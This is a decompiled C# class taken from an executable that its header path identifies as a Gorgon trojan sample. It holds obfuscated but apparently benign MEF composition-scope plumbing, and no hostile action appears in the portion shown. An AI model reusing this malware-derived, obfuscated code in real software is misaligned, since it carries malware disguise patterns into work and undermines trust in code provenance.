// Decompiled with JetBrains decompiler
// Type: z22cHri.59ZH9oz
// Assembly: gO77Fih, Version=16.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: F43F05C3-DF79-4EF2-8C94-619BF1ED6D3E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Gorgon.gen-83f6c309f411e1aebbdf75c62f67f163231f1b0ee065936230741272cda1cb9a.exe

using jWEwPnv;
using SgayAeV;
using System;
using System.Collections.Generic;
using System.ComponentModel.Composition;
using System.ComponentModel.Composition.Hosting;
using System.ComponentModel.Composition.Primitives;
using System.Linq;

namespace z22cHri
{
  [Serializable]
  public class \u00359ZH9oz : ICompositionScopeCreator
  {
    [ImportMany("System.ComponentModel.Composition.Caching.ScopeDefinition")]
    [NonSerialized]
    private IEnumerable<Lazy<object, IScopeDefinition>> \u0031b6XOst;

    public CompositionScopeDefinition yA0rfuH(
      ComposablePartCatalog KjsHlxl)
    {
      CompositionScopeDefinition compositionScopeDefinition = (CompositionScopeDefinition) null;
      if (!this.Wld6zo8(KjsHlxl, out compositionScopeDefinition))
        compositionScopeDefinition = new CompositionScopeDefinition(KjsHlxl, Enumerable.Empty<CompositionScopeDefinition>());
      return compositionScopeDefinition;
    }

    public bool Wld6zo8(ComposablePartCatalog v8kvRKH, out CompositionScopeDefinition _param2)
    {
      _param2 = (CompositionScopeDefinition) null;
      v8kvRKH.CreateCompositionService().SatisfyImportsOnce((object) this);
      if (this.\u0031b6XOst == null)
        return false;
      ILookup<string, string> lookup = this.\u0031b6XOst.Select<Lazy<object, IScopeDefinition>, IScopeDefinition>((Func<Lazy<object, IScopeDefinition>, IScopeDefinition>) (lTsspbh => lTsspbh.Metadata)).ToLookup<IScopeDefinition, string, string>((Func<IScopeDefinition, string>) (_param1 => _param1.ParentScopeContractName ?? string.Empty), (Func<IScopeDefinition, string>) (zeGODmz => zeGODmz.ScopeContractName));
      if (lookup[string.Empty].FirstOrDefault<string>() == null)
        return false;
      _param2 = this.An7wfqO(v8kvRKH, string.Empty, lookup);
      return true;
    }

    private CompositionScopeDefinition An7wfqO(
      ComposablePartCatalog j6o2wGV,
      string Z6vmWlx,
      ILookup<string, string> xZ1YJAa,
      ICollection<ComposablePartDefinition> xjQk8MC = null,
      HashSet<string> kwGo8Tt = null)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      \u00359ZH9oz.l6LUcfa l6Lucfa = (\u00359ZH9oz.l6LUcfa) new \u00359ZH9oz.aNQtWPS();
      // ISSUE: reference to a compiler-generated field
      l6Lucfa.VPTVsjs = Z6vmWlx;
      kwGo8Tt = kwGo8Tt ?? new HashSet<string>();
      // ISSUE: reference to a compiler-generated field
      if (!kwGo8Tt.Add(l6Lucfa.VPTVsjs))
        return (CompositionScopeDefinition) null;
      // ISSUE: reference to a compiler-generated field
      ((\u00359ZH9oz.aNQtWPS) l6Lucfa).BoYonm1 = new HashSet<ComposablePartDefinition>();
      List<CompositionScopeDefinition> compositionScopeDefinitionList = new List<CompositionScopeDefinition>();
      // ISSUE: reference to a compiler-generated field
      foreach (string Z6vmWlx1 in xZ1YJAa[l6Lucfa.VPTVsjs])
      {
        // ISSUE: reference to a compiler-generated field
        CompositionScopeDefinition compositionScopeDefinition = this.An7wfqO(j6o2wGV, Z6vmWlx1, xZ1YJAa, (ICollection<ComposablePartDefinition>) ((\u00359ZH9oz.aNQtWPS) l6Lucfa).BoYonm1, kwGo8Tt);
        if (compositionScopeDefinition != null)
          compositionScopeDefinitionList.Add(compositionScopeDefinition);
      }
      // ISSUE: reference to a compiler-generated field
      kwGo8Tt.Remove(l6Lucfa.VPTVsjs);
      IEnumerable<ExportDefinition> publicSurface = Enumerable.Empty<ExportDefinition>();
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated method
      // ISSUE: reference to a compiler-generated method
      // ISSUE: reference to a compiler-generated method
      FilteredCatalog filteredCatalog = !string.IsNullOrEmpty(l6Lucfa.VPTVsjs) ? j6o2wGV.Filter(new Func<ComposablePartDefinition, bool>(l6Lucfa.RXV7EtJ)).IncludeDependents((Func<ImportDefinition, bool>) (_param1 => _param1.Cardinality != ImportCardinality.ZeroOrMore)).Filter(new Func<ComposablePartDefinition, bool>(l6Lucfa.\u0038tNFTro)) : j6o2wGV.Filter(new Func<ComposablePartDefinition, bool>(l6Lucfa.\u00369B5jL1));
      if (xjQk8MC != null)
      {
        // ISSUE: reference to a compiler-generated field
        foreach (ComposablePartDefinition composablePartDefinition in filteredCatalog.Concat<ComposablePartDefinition>((IEnumerable<ComposablePartDefinition>) ((\u00359ZH9oz.aNQtWPS) l6Lucfa).BoYonm1))
          xjQk8MC.Add(composablePartDefinition);
      }
      return new CompositionScopeDefinition((ComposablePartCatalog) filteredCatalog, (IEnumerable<CompositionScopeDefinition>) compositionScopeDefinitionList.ToArray(), publicSurface);
    }
  }
}
